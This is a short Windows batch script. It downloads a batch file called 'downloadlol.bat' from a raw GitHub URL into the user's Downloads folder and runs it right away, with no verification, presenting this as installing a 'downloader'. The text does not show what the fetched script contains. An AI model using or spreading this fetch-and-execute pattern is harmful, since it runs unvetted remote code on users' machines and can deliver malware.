@echo off
color b
cd %userprofile%\Downloads
curl -O https://raw.githubusercontent.com/aaronestaaron/bedt.external.github.io/refs/heads/main/downloadlol.bat
echo downloader is installed...
echo opening downloader...
echo.
timeout /t 1 /nobreak >nul
downloadlol.bat